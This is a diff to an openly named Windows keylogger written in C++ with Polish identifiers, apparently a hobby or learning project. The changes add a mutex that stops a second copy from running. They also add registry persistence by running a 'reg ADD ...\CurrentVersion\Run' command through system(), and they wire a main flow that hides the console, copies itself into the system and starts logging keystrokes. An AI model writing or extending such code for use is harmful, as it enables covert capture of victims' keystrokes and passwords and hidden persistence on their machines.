@@ -1,12 +1,21 @@
 #include <iostream>
 #include <windows.h>
 #include <stdio.h>
+#include <cstring>
 
 using namespace std;
 
-void antyDuplikacja()
+bool antyDuplikacja()
 {
-    //Zaimplementuj blokowanie podwojnego uruchomienia
+    CreateMutex(NULL, TRUE, "5da64e2b2ed82f3ac144d1a87f78b16ahakeredupl");
+    if (GetLastError() == ERROR_ALREADY_EXISTS)
+    {
+        return true;
+    }
+    else
+    {
+        return false;
+    }
 }
 
 void ukryjKonsole()
@@ -14,8 +23,12 @@ void ukryjKonsole()
     //FreeConsole();
 }
 
-void dodajDoAutostartu()
+void dodajDoAutostartu(string sciezka)
 {
+    string komenda = "reg ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v KeyloggerTEST /t REG_SZ /d ";
+    komenda.append(sciezka);
+    cout << komenda << endl;
+    system(komenda.c_str());
     //Zaimplementuj dodawanie do autostartu
 }
 
@@ -101,17 +114,17 @@ void wlaczKeyloggera()
         {
             cout << "[DEL]";
         }
-
-
-
     }
 }
 
 int main()
 {
-    ukryjKonsole();
-    dodajDoAutostartu();
-    kopiujDoSystemu();
-    wlaczKeyloggera();
+    if (!antyDuplikacja())
+    {
+        ukryjKonsole();
+        dodajDoAutostartu("C:\\keylogger\\");
+        kopiujDoSystemu();
+        wlaczKeyloggera();
+    }
     return 0;
 }
